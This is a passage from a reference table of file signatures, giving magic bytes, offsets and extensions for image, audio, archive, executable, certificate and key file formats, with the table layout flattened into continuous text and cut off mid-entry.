<code>II*\u2400\u2410\u2400\u2400\u2400CR</code> 0 cr2 Canon RAW Format Version 211(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-11)  Canon's RAW format is based on TIFF.12(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-12) <code>80 2A 5F D7</code> <code>\u20ac*_\u00d7</code> 0 cin Kodak Cineon image <code>52 4E 43 01</code> <code>52 4E 43 02</code> <code>RNC\u2401</code> <code>RNC\u2402</code> 0 Compressed file using Rob Northen Compression (version 1 and 2) algorithm13(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-13) <code>4E 55 52 55 49 4D 47</code> <code>4E 55 52 55 50 41 4C</code> <code>NURUIMG</code> <code>NURUPAL</code> 0 nui  nup nuru ASCII/ANSI image and palette files14(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-14) <code>53 44 50 58</code> (big-endian format) <code>SDPX</code> 0 dpx SMPTE DPX image <code>58 50 44 53</code> (little-endian format) <code>XPDS</code> <code>76 2F 31 01</code> <code>v/1\u2401</code> 0 exr OpenEXR image <code>42 50 47 FB</code> <code>BPG\u00fb</code> 0 bpg Better Portable Graphics format15(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-15) <code>FF D8 FF DB</code> <code>\u00ff\u00d8\u00ff\u00db</code> 0 jpg  jpeg JPEG raw or in the JFIF or Exif file format16(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-:0-16) <code>FF D8 FF E0 00 10 4A 46   49 46 00 01</code> <code>\u00ff\u00d8\u00ff\u00e0\u2400\u2410JFIF\u2400\u2401</code> <code>FF D8 FF EE</code> <code>\u00ff\u00d8\u00ff\u00ee</code> <code>FF D8 FF E1\u00a0??\u00a0?? 45 78   69 66 00 00</code> <code>\u00ff\u00d8\u00ff\u00e1??Exif\u2400\u2400</code> <code>FF D8 FF E0</code> <code>\u00ff\u00d8\u00ff\u00e0</code> 0 jpg JPEG raw or in the JFIF or Exif file format16(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-:0-16) <code>00 00 00 0C 6A 50 20 20 0D 0A 87 0A</code> <code>\u2400\u2400\u2400\u240cjP\u2420\u2420\u240d\u240a\u2021\u240a</code> 0 jp2  j2k  jpf  jpm  jpg2  j2c  jpc  jpx  mj2 JPEG 2000 format17(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-17) <code>FF 4F FF 51</code> <code>\u00ffO\u00ffQ</code> <code>71 6f 69 66</code> <code>qoif</code> 0 qoi QOI - The \u201cQuite OK Image Format\u201d18(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-18) <code>46 4F 52 4D\u00a0??\u00a0??\u00a0??\u00a0??   49 4C 42 4D</code> <code>FORM????ILBM</code> 0  any ilbm  lbm  ibm  iff IFF Interleaved Bitmap Image <code>46 4F 52 4D\u00a0??\u00a0??\u00a0??\u00a0??   38 53 56 58</code> <code>FORM????8SVX</code> 0  any 8svx  8sv  svx  snd  iff IFF 8-Bit Sampled Voice <code>46 4F 52 4D\u00a0??\u00a0??\u00a0??\u00a0??   41 43 42 4D</code> <code>FORM????ACBM</code> 0  any acbm  iff Amiga Contiguous Bitmap <code>46 4F 52 4D\u00a0??\u00a0??\u00a0??\u00a0??   41 4E 42 4D</code> <code>FORM????ANBM</code> 0  any anbm  iff IFF Animated Bitmap <code>46 4F 52 4D\u00a0??\u00a0??\u00a0??\u00a0??   41 4E 49 4D</code> <code>FORM????ANIM</code> 0  any anim  iff IFF CEL Animation <code>46 4F 52 4D\u00a0??\u00a0??\u00a0??\u00a0??   46 41 58 58</code> <code>FORM????FAXX</code> 0  any faxx  fax  iff IFF Facsimile Image <code>46 4F 52 4D\u00a0??\u00a0??\u00a0??\u00a0??   46 54 58 54</code> <code>FORM????FTXT</code> 0  any ftxt  iff IFF Formatted Text <code>46 4F 52 4D\u00a0??\u00a0??\u00a0??\u00a0??   53 4D 55 53</code> <code>FORM????SMUS</code> 0  any smus  smu  mus  iff IFF Simple Musical Score <code>46 4F 52 4D\u00a0??\u00a0??\u00a0??\u00a0??   43 4D 55 53</code> <code>FORM????CMUS</code> 0  any cmus  mus  iff IFF Musical Score <code>46 4F 52 4D\u00a0??\u00a0??\u00a0??\u00a0??   59 55 56 4E</code> <code>FORM????YUVN</code> 0  any yuvn  yuv  iff IFF YUV Image <code>46 4F 52 4D\u00a0??\u00a0??\u00a0??\u00a0??   46 41 4E 54</code> <code>FORM????FANT</code> 0  any iff Amiga Fantavision Movie <code>46 4F 52 4D\u00a0??\u00a0??\u00a0??\u00a0??   41 49 46 46</code> <code>FORM????AIFF</code> 0  any aiff  aif  aifc  snd  iff Audio Interchange File Format <code>4C 5A 49 50</code> <code>LZIP</code> 0 lz lzip compressed file19(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-19) <code>30 37 30 37 30 37</code> <code>070707</code> 0 cpio cpio archive file20(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-Cpio_file_format-20) <code>4D 5A</code> <code>MZ</code> 0 exe  dll  mui  sys  scr  cpl  ocx  ax  iec  ime  rs  tsp  fon  efi DOS MZ executable and its descendants (including NE and PE) <code>5A 4D</code> <code>ZM</code> 0 exe DOS ZM executable and its descendants (rare) <code>50 4B 03 04</code> <code>50 4B 05 06</code> (empty archive)  <code>50 4B 07 08</code> (spanned archive) <code>PK\u2403\u2404</code> <code>PK\u2405\u2406</code> <code>PK\u2407\u2408</code> 0 zip  aar  apk  docx  epub  ipa jar  kmz  maff msix  odp  ods  odt  pk3  pk4  pptx  usdz  vsdx  xlsx  xpi zip file format and formats based on it, such as EPUB, JAR, ODF, OOXML <code>52 61 72 21 1A 07 00</code> <code>Rar!\u241a\u2407\u2400</code> 0 rar Roshal ARchive compressed archive v1.50 onwards21(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-21) <code>52 61 72 21 1A 07 01 00</code> <code>Rar!\u241a\u2407\u2401\u2400</code> 0 rar Roshal ARchive compressed archive v5.00 onwards22(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-22) <code>7F 45 4C 46</code> <code>\u2421ELF</code> 0 Executable and Linkable Format <code>89 50 4E 47 0D 0A 1A 0A</code> <code>\u2030PNG\u240d\u240a\u241a\u240a</code> 0 png Image encoded in the Portable Network Graphics format23(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-23) <code>C9</code> <code>\u00c9</code> 0 com CP/M 3 and higher with overlays24(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-Elliott_CPM3_COM-24) <code>CA FE BA BE</code> <code>\u00ca\u00fe\u00ba\u00be</code> 0 class Java class file, Mach-O Fat Binary <code>EF BB BF</code> <code>\u00ef\u00bb\u00bf</code> 0 txt  others UTF-8 byte order mark, commonly seen in text files.25(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-BOM-25)26(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-XML-26)27(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-SDL-27) <code>FF FE</code> <code>\u00ff\u00fe</code> 0 txt  others UTF-16LE byte order mark, commonly seen in text files.25(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-BOM-25)26(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-XML-26)27(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-SDL-27) <code>FE FF</code> <code>\u00fe\u00ff</code> 0 txt  others UTF-16BE byte order mark, commonly seen in text files.25(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-BOM-25)26(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-XML-26)27(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-SDL-27) <code>FF FE 00 00</code> <code>\u00ff\u00fe\u2400\u2400</code> 0 txt  others UTF-32LE byte order mark for text25(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-BOM-25)27(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-SDL-27) <code>00 00 FE FF</code> <code>\u2400\u2400\u00fe\u00ff</code> 0 txt  others UTF-32BE byte order mark for text25(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-BOM-25)27(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-SDL-27) <code>2B 2F 76 38</code> <code>2B 2F 76 39</code> <code>2B 2F 76 2B</code> <code>2B 2F 76 2F</code> <code>+/v8</code> <code>+/v9</code> <code>+/v+</code> <code>+/v/</code> 0 UTF-7 byte order mark for text28(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-BG-28)27(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-SDL-27) <code>0E FE FF</code> <code>\u240e\u00fe\u00ff</code> 0 txt  others SCSU byte order mark for text28(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-BG-28)27(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-SDL-27) <code>DD 73 66 73</code> <code>\u00ddsfs</code> 0 UTF-EBCDIC byte order mark for text28(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-BG-28)27(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-SDL-27) <code>FE ED FA CE</code> <code>\u00fe\u00ed\u00fa\u00ce</code> 0  0x1000 Mach-O binary (32-bit) <code>FE ED FA CF</code> <code>\u00fe\u00ed\u00fa\u00cf</code> 0  0x1000 Mach-O binary (64-bit) <code>FE ED FE ED</code> <code>\u00fe\u00ed\u00fe\u00ed</code> 0 JKS Javakey Store29(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-29) <code>CE FA ED FE</code> <code>\u00ce\u00fa\u00ed\u00fe</code> 0 Mach-O binary (reverse byte ordering scheme, 32-bit)30(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-apple.com-30) <code>CF FA ED FE</code> <code>\u00cf\u00fa\u00ed\u00fe</code> 0 Mach-O binary (reverse byte ordering scheme, 64-bit)30(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-apple.com-30) <code>25 21 50 53</code> <code>%!PS</code> 0 ps PostScript document <code>25 21 50 53 2D 41 64 6F 62 65 2D 33 2E 30 20 45 50 53 46 2D 33 2E 30</code> <code>%!PS-Adobe-3.0 ESPF-3.0</code> 0 eps  epsf Encapsulated PostScript file version 3.031(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-Encapsulated_PostScript_(EPS)_File_Format,_Version_3.0-31) <code>25 21 50 53 2D 41 64 6F 62 65 2D 33 2E 31 20 45 50 53 46 2D 33 2E 30</code> <code>%!PS-Adobe-3.1 ESPF-3.0</code> 0 eps  epsf Encapsulated PostScript file version 3.132(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-Encapsulated_PostScript_(EPS)_File_Format,_Version_3.1-32) <code>49 54 53 46 03 00 00 00   60 00 00 00</code> <code>ITSF\u2403\u2400\u2400\u2400`\u2400\u2400\u2400</code> 0 chm MS Windows HtmlHelp Data <code>3F 5F</code> <code>?_</code> 0 hlp Windows 3.x/95/98 Help file <code>25 50 44 46 2D</code> <code>%PDF-</code> 0 pdf PDF document33(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-33) <code>30 26 B2 75 8E 66 CF 11   A6 D9 00 AA 00 62 CE 6C</code> <code>0&amp;\u00b2u\u017df\u00cf\u2411\u00a6\u00d9\u2400\u00aa\u2400b\u00cel</code> 0 asf  wma  wmv Advanced Systems Format34(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-34) <code>24 53 44 49 30 30 30 31</code> <code>$SDI0001</code> 0 System Deployment Image, a disk image format used by Microsoft <code>4F 67 67 53</code> <code>OggS</code> 0 ogg  oga  ogv Ogg, an open source media container format <code>38 42 50 53</code> <code>8BPS</code> 0 psd Photoshop Document file, Adobe Photoshop's native file format <code>52 49 46 46\u00a0??\u00a0??\u00a0??\u00a0??   57 41 56 45</code> <code>RIFF????WAVE</code> 0 wav Waveform Audio File Format35(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-35) <code>52 49 46 46\u00a0??\u00a0??\u00a0??\u00a0??   41 56 49 20</code> <code>RIFF????AVI\u2420</code> 0 avi Audio Video Interleave video format36(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-36) <code>FF FB</code> <code>FF F3</code> <code>FF F2</code> <code>\u00ff\u00fb</code> <code>\u00ff\u00f3</code> <code>\u00ff\u00f2</code> 0 mp3 MPEG-1 Layer 3 file without an ID3 tag or with an ID3v1 tag (which is appended at the end of the file) <code>49 44 33</code> <code>ID3</code> 0 mp3 MP3 file with an ID3v2 container <code>42 4D</code> <code>BM</code> 0 bmp  dib BMP file, a bitmap format used mostly in the Windows world <code>43 44 30 30 31</code> <code>CD001</code> 0x8001  0x8801  0x9001 iso ISO9660 CD/DVD image file37(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-37) <code>43 44 30 30 31</code> <code>CD001</code> 0x5EAC9 cdi CD-i CD image file <code>6D 61 69 6E 2E 62 73</code> <code>main.bs</code> 0 mgw Nintendo Game &amp; Watch image file <code>4E 45 53</code> <code>NES</code> 0 nes Nintendo Entertainment System image file <code>A0 32 41 A0 A0 A0</code> <code>2A</code> 0x165A4 d64 Commodore 64 1541 disk image (D64 format) <code>47 53 52 2D 31 35 34 31</code> <code>GCR-1541</code> 0 g64 Commodore 64 1541 disk image (G64 format) <code>A0 33 44 A0 A0</code> <code>3D</code> 0x61819 d81 Commodore 64 1581 disk image (D81 format) <code>43 36 34 20 74 61 70 65 20 69 6D 61 67 65 20 66 69 6C 65</code> <code>C64 tape image file</code> 0 t64 Commodore 64 tape image <code>43 36 34 20 43 41 52 54 52 49 44 47 45 20 20 20</code> <code>C64 CARTRIDGE</code> 0 crt Commodore 64 cartridge image <code>53 49 4D 50 4C 45 20 20   3D 20 20 20 20 20 20 20   20 20 20 20 20 20 20 20   20 20 20 20 20 54</code> <code>SIMPLE\u2420\u2420   =\u2420\u2420\u2420\u2420\u2420\u2420\u2420   \u2420\u2420\u2420\u2420\u2420\u2420\u2420\u2420   \u2420\u2420\u2420\u2420\u2420T</code> 0 fits Flexible Image Transport System (FITS)38(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-38) <code>66 4C 61 43</code> <code>fLaC</code> 0 flac Free Lossless Audio Codec39(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-39) <code>4D 54 68 64</code> <code>MThd</code> 0 mid  midi MIDI sound file40(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-40) <code>D0 CF 11 E0 A1 B1 1A E1</code> <code>\u00d0\u00cf\u2411\u00e0\u00a1\u00b1\u241a\u00e1</code> 0 doc  xls  ppt  msi  msg Compound File Binary Format, a container format defined by Microsoft COM. It can contain the equivalent of files and directories. It is used by Windows Installer and for documents in older versions of Microsoft Office.41(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-41) It can be used by other programs as well that rely on the COM and OLE API's. <code>64 65 78 0A 30 33 35 00</code> <code>dex\u240a035\u2400</code> 0 dex Dalvik Executable <code>4B 44 4D</code> <code>KDM</code> 0 vmdk VMDK files42(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-42)43(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-43) <code>23 20 44 69 73 6B 20 44 65 73 63 72 69 70 74 6F</code> <code># Disk Descripto</code> 0 vmdk VMware 4 Virtual Disk description file (split disk) <code>43 72 32 34</code> <code>Cr24</code> 0 crx Google Chrome extension44(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-44) or packaged app45(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-45) <code>41 47 44 33</code> <code>AGD3</code> 0 fh8 FreeHand 8 document46(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-46)47(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-47) <code>05 07 00 00 42 4F 42 4F   05 07 00 00 00 00 00 00   00 00 00 00 00 01</code> <code>\u2405\u2407\u2400\u2400BOBO   \u2405\u2407\u2400\u2400\u2400\u2400\u2400\u2400   \u2400\u2400\u2400\u2400\u2400\u2401</code> 0 cwk AppleWorks 5 document <code>06 07 E1 00 42 4F 42 4F   06 07 E1 00 00 00 00 00   00 00 00 00 00 01</code> <code>\u2406\u2407\u00e1\u2400BOBO   \u2406\u2407\u00e1\u2400\u2400\u2400\u2400\u2400   \u2400\u2400\u2400\u2400\u2400\u2401</code> 0 cwk AppleWorks 6 document <code>45 52 02 00 00 00</code> <code>ER\u2402\u2400\u2400\u2400</code> 0 toast Roxio Toast disc image file <code>8B 45 52 02 00 00 00</code> <code>\u2039ER\u2402\u2400\u2400\u2400</code> <code>6B 6F 6C 79</code> <code>koly</code> end\u2013512 dmg Apple Disk Image file <code>78 61 72 21</code> <code>xar!</code> 0 xar eXtensible ARchive format48(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-48) <code>50 4D 4F 43 43 4D 4F 43</code> <code>PMOCCMOC</code> 0 dat Windows Files And Settings Transfer Repository49(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-49) See also USMT 3.0 (Win XP)50(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-50) and USMT 4.0 (Win 7)51(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-51) User Guides <code>4E 45 53 1A</code> <code>NES\u241a</code> 0 nes Nintendo Entertainment System ROM file52(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-52) <code>75 73 74 61 72 00 30 30</code> <code>75 73 74 61 72 20 20 00</code> <code>ustar\u240000</code> <code>ustar\u2420\u2420\u2400</code> 257 tar tar archive53(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-53) <code>4F 41 52\u00a0??</code> <code>OAR?</code> 0 oar OAR file archive format, where\u00a0?? is the format version. <code>74 6F 78 33</code> <code>tox3</code> 0 tox Open source portable voxel file54(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-54) <code>4D 4C 56 49</code> <code>MLVI</code> 0 MLV Magic Lantern Video file55(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-55) <code>44 43 4D 01 50 41 33 30</code> <code>50 41 33 30</code> <code>DCM\u2401PA30</code> <code>PA30</code> 0 Windows Update Binary Delta Compression file56(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-56) <code>37 7A BC AF 27 1C</code> <code>7z\u00bc\u00af'\u241c</code> 0 7z 7-Zip File Format <code>1F 8B</code> <code>\u241f\u2039</code> 0 gz  tar.gz GZIP compressed file57(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-57) <code>FD 37 7A 58 5A 00</code> <code>\u00fd7zXZ\u2400</code> 0 xz  tar.xz XZ compression utility  using LZMA2 compression <code>04 22 4D 18</code> <code>\u2404\"M\u2418</code> 0 lz4 LZ4 Frame Format58(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-58)  Remark: LZ4 block format does not offer any magic bytes.59(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-59) <code>4D 53 43 46</code> <code>MSCF</code> 0 cab Microsoft Cabinet file <code>53 5A 44 44 88 F0 27 33</code> <code>SZDD\u02c6\u00f0'3</code> 0 ??_ Microsoft compressed file in Quantum format, used prior to Windows XP. File can be decompressed using Extract.exe or Expand.exe distributed with earlier versions of Windows. After compression, the last character of the original filename extension is replaced with an underscore, e.g. \u2018Setup.exe\u2019 becomes \u2018Setup.ex_\u2019. <code>46 4C 49 46</code> <code>FLIF</code> 0 flif Free Lossless Image Format <code>1A 45 DF A3</code> <code>\u241aE\u00df\u00a3</code> 0 mkv  mka  mks  mk3d  webm Matroska media container, including WebM <code>4D 49 4C 20</code> <code>MIL\u2420</code> 0 stg \"SEAN\u00a0: Session Analysis\" Training file. Also used in compatible software \"Rpw\u00a0: Rowperfect for Windows\" and \"RP3W\u00a0: ROWPERFECT3 for Windows\". <code>41 54 26 54 46 4F 52 4D   \u00a0??\u00a0??\u00a0??\u00a0?? 44 4A 56</code> <code>AT&amp;TFORM????DJV</code> 0 djvu  djv DjVu document  The following byte is either <code>55</code> (<code>U</code>) for single-page or <code>4D</code> (<code>M</code>) for multi-page documents. <code>30 82</code> <code>0\u201a</code> 0 der DER encoded X.509 certificate <code>2D 2D 2D 2D 2D 42 45 47 49 4E 20 43 45 52 54 49 46 49 43 41 54 45 2D 2D 2D 2D 2D</code> <code>-----BEGIN CERTIFICATE-----</code> 0 crt  pem PEM encoded X.509 certificate <code>2D 2D 2D 2D 2D 42 45 47 49 4E 20 43 45 52 54 49 46 49 43 41 54 45 20 52 45 51 55 45 53 54 2D 2D 2D 2D 2D</code> <code>-----BEGIN CERTIFICATE REQUEST-----</code> 0 csr  pem PEM encoded X.509 Certificate Signing Request <code>2D 2D 2D 2D 2D 42 45 47 49 4E 20 50 52 49 56 41 54 45 20 4B 45 59 2D 2D 2D 2D 2D</code> <code>-----BEGIN PRIVATE KEY-----</code> 0 key  pem PEM encoded X.509 PKCS#8 private key <code>2D 2D 2D 2D 2D 42 45 47 49 4E 20 44 53 41 20 50 52 49 56 41 54 45 20 4B 45 59 2D 2D 2D 2D 2D</code> <code>-----BEGIN DSA PRIVATE KEY-----</code> 0 key  pem PEM encoded X.509 PKCS#1 DSA private key <code>2D 2D 2D 2D 2D 42 45 47 49 4E 20 52 45 41 20 50 52 49 56 41 54 45 20 4B 45 59 2D 2D 2D 2D 2D</code> <code>-----BEGIN RSA PRIVATE KEY-----</code> 0 key  pem PEM encoded X.509 PKCS#1 RSA private key <code>50 75 54 54 59 2D 55 73 65 72 2D 4B 65 79 2D 46 69 6C 65 2D 32 3A</code> <code>PuTTY-User-Key-File-2:</code> 0 ppk PuTTY private key file version 2 <code>50 75 54 54 59 2D 55 73 65 72 2D 4B 65 79 2D 46 69 6C 65 2D 33 3A</code> <code>PuTTY-User-Key-File-3:</code> 0 ppk PuTTY private key file version 3 <code>2D 2D 2D 2D 2D 42 45 47 49 4E 20 4F 50 45 4E 53 53 48 20 50 52 49 56 41 54 45 20 4B 45 59 2D 2D 2D 2D 2D</code> <code>-----BEGIN OPENSSH PRIVATE KEY-----</code> 0 OpenSSH private key file <code>2D 2D 2D 2D 2D 42 45 47 49 4E 20 53 53 48 32 20 4B 45 59 2D 2D 2D 2D 2D</code> <code>-----BEGIN SSH2 PUBLIC KEY-----</code> 0 pub OpenSSH public key file <code>44 49 43 4D</code> <code>DICM</code> 128 dcm DICOM Medical File Format <code>77 4F 46 46</code> <code>wOFF</code> 0 woff WOFF File Format 1.060(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-60) <code>77 4F 46 32</code> <code>wOF2</code> 0 woff2 WOFF File Format 2.061(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-61) <code>3C 3F 78 6D 6C 20</code> <code>&lt;?xml\u2420</code> 0  after BOM xml eXtensible Markup Language26(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-XML-26)62(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-62) <code>3C 00 3F 00 78 00 6D 00   6C 00 20</code> <code>&lt;\u2400?\u2400x\u2400m\u2400l\u2400\u2420\u2400</code> <code>00 3C 00 3F 00 78 00 6D   00 6C 00 20</code> <code>\u2400&lt;\u2400?\u2400x\u2400m\u2400l\u2400\u2420</code> <code>3C 00 00 00 3F 00 00 00   78 00 00 00 6D 00 00 00   6C 00 00 00 20 00 00 00</code> <code>&lt;\u2400\u2400\u2400?\u2400\u2400\u2400   x\u2400\u2400\u2400m\u2400\u2400\u2400   l\u2400\u2400\u2400\u2420\u2400\u2400\u2400</code> <code>00 00 00 3C 00 00 00 3F   00 00 00 78 00 00 00 6D   00 00 00 6C 00 00 00 20</code> <code>\u2400\u2400\u2400&lt;\u2400\u2400\u2400?   \u2400\u2400\u2400x\u2400\u2400\u2400m   \u2400\u2400\u2400l\u2400\u2400\u2400\u2420</code> <code>4C 6F A7 94 93 40</code> <code>Lo\u00a7\u201d\u201c@</code> <code>00 61 73 6D</code> <code>\u2400asm</code> 0 wasm WebAssembly binary format63(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-63) <code>CF 84 01</code> <code>\u00cf\u201e\u2401</code> 0 lep Lepton compressed JPEG image64(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-64) <code>43 57 53</code> <code>CWS</code> 0 swf Adobe Flash .swf <code>46 57 53</code> <code>FWS</code> <code>21 3C 61 72 63 68 3E 0A</code> <code>!&lt;arch&gt;\u240a</code> 0 deb linux deb file <code>52 49 46 46\u00a0??\u00a0??\u00a0??\u00a0??   57 45 42 50</code> <code>RIFF????WEBP</code> 0 webp Google WebP image file, where\u00a0??\u00a0??\u00a0??\u00a0?? is the file size. More information on WebP File Header <code>27 05 19 56</code> <code>'\u2405\u2419V</code> 0 U-Boot / uImage. Das U-Boot Universal Boot Loader.65(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-65) <code>7B 5C 72 74 66 31</code> <code>{\\rtf1</code> 0 rtf Rich Text Format <code>54 41 50 45</code> <code>TAPE</code> 0 Microsoft Tape Format <code>47</code> <code>G</code> 0  0xBC  0x178  ...  (every 188th byte) ts  tsv  tsa  mpg  mpeg MPEG Transport Stream (MPEG-2 Part 1)66(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-66) <code>00 00 01 BA</code> <code>\u2400\u2400\u2401\u00ba</code> 0 m2p  vob  mpg  mpeg MPEG Program Stream (MPEG-1 Part 1 (essentially identical) and MPEG-2 Part 1) <code>00 00 01 B3</code> <code>\u2400\u2400\u2401\u00b3</code> 0 mpg  mpeg MPEG-1 video and MPEG-2 video (MPEG-1 Part 2 and MPEG-2 Part 2) <code>66 74 79 70 69 73 6F 6D</code> <code>ftypisom</code> 4 mp4 ISO Base Media file (MPEG-4) <code>66 74 79 70 4D 53 4E 56</code> <code>ftypMSNV</code> 4 mp4 MPEG-4 video file <code>78 01</code> <code>x\u2401</code> 0 zlib No Compression (no preset dictionary) <code>78 5E</code> <code>x^</code> Best speed (no preset dictionary) <code>78 9C</code> <code>x\u0153</code> Default Compression (no preset dictionary) <code>78 DA</code> <code>x\u00da</code> Best Compression (no preset dictionary) <code>78 20</code> <code>x\u2420</code> No Compression (with preset dictionary) <code>78 7D</code> <code>x}</code> Best speed (with preset dictionary) <code>78 BB</code> <code>x\u00bb</code> Default Compression (with preset dictionary) <code>78 F9</code> <code>x\u00f9</code> Best Compression (with preset dictionary) <code>62 76 78 32</code> <code>bvx2</code> 0 lzfse LZFSE - Lempel-Ziv style data compression algorithm using Finite State Entropy coding. OSS by Apple.67(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-67) <code>4F 52 43</code> <code>ORC</code> 0 orc Apache ORC (Optimized Row Columnar) file format <code>4F 62 6A 01</code> <code>Obj\u2401</code> 0 avro Apache Avro binary file format <code>53 45 51 36</code> <code>SEQ6</code> 0 rc RCFile columnar file format <code>3C 72 6F 62 6C 6F 78 21</code> <code>&lt;roblox!</code> 0 rbxl Roblox place file 68(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-68) <code>65 87 78 56</code> <code>e\u2021xV</code> 0 p25  obt PhotoCap Object Templates <code>55 55 AA AA</code> <code>UU\u00aa\u00aa</code> 0 pcv PhotoCap Vector <code>78 56 34</code> <code>xV4</code> 0 pbt  pdt  pea  peb  pet  pgt  pict  pjt  pkt  pmt PhotoCap Template <code>50 41 52 31</code> <code>PAR1</code> 0 Apache Parquet columnar file format <code>45 4D 58 32</code> <code>EMX2</code> 0 ez2 Emulator Emaxsynth samples <code>45 4D 55 33</code> <code>EMU3</code> 0 ez3  iso Emulator III synth samples <code>1B 4C 75 61</code> <code>\u241bLua</code> 0 luac Lua bytecode69(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-69) <code>62 6F 6F 6B 00 00 00 00   6D 61 72 6B 00 00 00 00</code> <code>book\u2400\u2400\u2400\u2400mark\u2400\u2400\u2400\u2400</code> 0 alias macOS file Alias70(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-70) (Symbolic link) <code>5B 5A 6F 6E 65 54 72 61   6E 73 66 65 72 5D</code> <code>[ZoneTransfer]</code> 0 Identifier Microsoft Zone Identifier for URL Security Zones71(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-71)72(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-72) <code>52 65 63 65 69 76 65 64   3A</code> <code>Received:</code> 0 eml Email Message var5[citation needed] <code>20 02 01 62 A0 1E AB 07   02 00 00 00</code> <code>\u2420\u2402\u2401b\u237d\u241e\u00ab\u2407\u2402\u2400\u2400\u2400</code> 0 tde Tableau Datasource <code>37 48 03 02 00 00 00 00   58 35 30 39 4B 45 59</code> <code>7H\u2403\u2402\u2400\u2400\u2400\u2400X509KEY</code> 0 kdb KDB file <code>85\u00a0??\u00a0?? 03</code> <code>\u2026??\u2403</code> 0 pgp PGP file 73(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-73) <code>28 B5 2F FD</code> <code>(\u00b5/\u00fd</code> 0 zst Zstandard compress74(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-74)75(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-75) <code>52 53 56 4B 44 41 54 41</code> <code>RSVKDATA</code> 0 rs QuickZip rs compressed archive76(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-76)77(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-77) <code>3A 29 0A</code> <code>:)\u240a</code> 0 sml Smile file <code>4A 6F 79 21</code> <code>Joy!</code> 0 Preferred Executable Format <code>31 0A 30 30</code> <code>1\u240a00</code> 0 srt SubRip File <code>34 12 AA 55</code> <code>4\u2412\u00aaU</code> 0 vpk VPK file, used to store game data for some Source Engine games <code>2A 2A 41 43 45 2A 2A</code> <code>**ACE**</code> 7 ace ACE (compressed file 